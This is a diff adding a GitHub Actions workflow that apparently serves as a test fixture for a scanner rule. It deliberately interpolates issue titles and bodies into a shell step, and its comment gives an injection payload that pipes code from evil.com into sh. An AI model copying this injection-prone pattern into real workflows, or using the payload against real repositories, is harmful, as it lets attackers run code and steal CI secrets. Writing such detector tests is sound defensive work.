@@ -1,0 +1,17 @@
+# Issue title is attacker-controlled and gets interpolated directly into a
+# shell script. Open an issue with title `"; curl evil.com/x | sh; #` and the
+# bot runs it. VC186 must fire.
+name: Welcome new issues
+
+on:
+  issues:
+    types: [opened]
+
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Echo title
+        run: |
+          echo "New issue: ${{ github.event.issue.title }}"
+          echo "Body: ${{ github.event.issue.body }}"
